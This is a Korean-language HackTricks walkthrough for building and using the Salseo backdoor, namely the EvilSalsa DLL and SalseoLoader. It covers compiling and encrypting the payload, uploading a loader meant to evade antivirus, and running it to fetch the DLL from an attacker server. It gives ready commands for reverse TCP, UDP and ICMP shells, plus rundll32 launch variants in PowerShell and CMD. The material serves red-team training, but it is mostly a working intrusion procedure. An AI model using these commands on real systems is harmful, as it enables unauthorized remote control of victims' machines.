# 살세오

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**

</details>
{% endhint %}

## 이진 파일 컴파일

깃허브에서 소스 코드를 다운로드하고 **EvilSalsa** 및 **SalseoLoader**를 컴파일합니다. 코드를 컴파일하려면 **Visual Studio**가 설치되어 있어야 합니다.

이 프로젝트를 사용할 Windows 환경의 아키텍처에 맞게 컴파일하세요(Windows가 x64를 지원하는 경우 해당 아키텍처로 컴파일).

Visual Studio에서 **"Platform Target"**에서 **왼쪽 "Build" 탭**에서 아키텍처를 선택할 수 있습니다.

(\*\*이 옵션을 찾을 수 없는 경우 **"Project Tab"**을 누르고 **"\<Project Name> Properties"**를 선택하세요)

![](<../.gitbook/assets/image (132).png>)

그런 다음, 두 프로젝트를 빌드하세요 (Build -> Build Solution) (로그에 실행 파일의 경로가 표시됩니다):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 백도어 준비

먼저, **EvilSalsa.dll**을 인코딩해야 합니다. 이를 위해 python 스크립트 **encrypterassembly.py**를 사용하거나 프로젝트 **EncrypterAssembly**를 컴파일할 수 있습니다:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
이제 Salseo 작업을 실행하는 데 필요한 모든 것을 갖추었습니다: **인코딩된 EvilDalsa.dll**과 **SalseoLoader의 이진 파일**.

**SalseoLoader.exe 바이너리를 기계에 업로드하세요. 어떤 AV에서도 감지되지 않아야 합니다...**

## **백도어 실행**

### **TCP 역쉘 획득 (HTTP를 통해 인코딩된 dll 다운로드)**

역쉘 리스너로 nc를 시작하고 인코딩된 evilsalsa를 제공하기 위해 HTTP 서버를 시작하는 것을 기억하세요.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP 리버스 쉘 획득 (SMB를 통해 인코딩된 dll 다운로드)**

UDP 리버스 쉘 수신기로 nc를 시작하고, 인코딩된 evilsalsa를 제공하기 위해 SMB 서버를 시작하세요 (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP 역쉘 얻기 (인코딩된 dll 이미 피해자 내부에 존재)**

**이번에는 역쉘을 수신하기 위해 클라이언트에 특수 도구가 필요합니다. 다운로드:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP 응답 비활성화:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 클라이언트 실행:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 피해자 내부에서, salseo 작업을 실행합니다:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## DLL 내보내기 메인 함수로 SalseoLoader 컴파일

Visual Studio를 사용하여 SalseoLoader 프로젝트를 엽니다.

### 메인 함수 앞에 추가: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 이 프로젝트에 DllExport 설치

#### **도구** --> **NuGet 패키지 관리자** --> **솔루션용 NuGet 패키지 관리...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport 패키지 검색 (탐색 탭 사용)하고 설치를 누릅니다 (팝업을 수락)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

프로젝트 폴더에 **DllExport.bat** 및 **DllExport\_Configure.bat** 파일이 나타납니다.

### DllExport 제거

**제거**를 누릅니다 (그렇습니다, 이상하지만 믿어주세요, 필요합니다)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio 종료 및 DllExport\_configure 실행

그냥 Visual Studio를 **종료**합니다

그런 다음 **SalseoLoader 폴더**로 이동하여 **DllExport\_Configure.bat**을 실행합니다

**x64**를 선택합니다 (x64 상자 내에서 사용할 것이므로, 제 경우에 해당), **System.Runtime.InteropServices** (DllExport 내부의 **Namespace**에서)를 선택하고 **적용**을 누릅니다

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### 프로젝트를 다시 Visual Studio로 엽니다

**\[DllExport]**가 더 이상 오류로 표시되지 않아야 합니다

![](<../.gitbook/assets/image (8) (1).png>)

### 솔루션 빌드

**출력 유형 = 클래스 라이브러리** 선택 (프로젝트 --> SalseoLoader 속성 --> 응용 프로그램 --> 출력 유형 = 클래스 라이브러리)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 플랫폼** 선택 (프로젝트 --> SalseoLoader 속성 --> 빌드 --> 플랫폼 대상 = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

솔루션을 **빌드**하려면: 빌드 --> 솔루션 빌드 (출력 콘솔 내에 새 DLL의 경로가 나타납니다)

### 생성된 Dll 테스트

Dll을 테스트하려는 위치로 복사하여 붙여넣습니다.

실행:
```
rundll32.exe SalseoLoader.dll,main
```
만약 오류가 나타나지 않는다면, 아마도 기능적인 DLL이 있을 것입니다!!

## DLL을 사용하여 쉘 획득

**HTTP** **서버**를 사용하고 **nc** **리스너**를 설정하는 것을 잊지 마세요

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 팁을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
{% endhint %}
